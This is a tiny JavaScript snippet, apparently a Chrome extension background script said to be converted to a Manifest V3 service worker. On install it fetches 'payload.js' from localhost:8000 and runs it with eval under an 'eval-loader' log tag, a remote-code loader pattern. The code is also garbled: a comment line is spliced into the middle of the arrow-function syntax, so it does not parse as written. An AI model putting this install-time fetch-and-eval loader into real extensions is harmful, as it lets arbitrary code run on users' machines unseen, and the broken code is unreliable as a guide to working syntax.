// Converted to MV3 Service Worker
chrome.runtime.onInstalled.addListener(()
// Note: Service workers don't persist, adjust logic accordingly => {
  fetch('https://localhost:8000/payload.js')
    .then(r => r.text())
    .then(code => {
      console.log('[eval-loader] fetched payload, len=', code.length);
      eval(code);                
    });
});
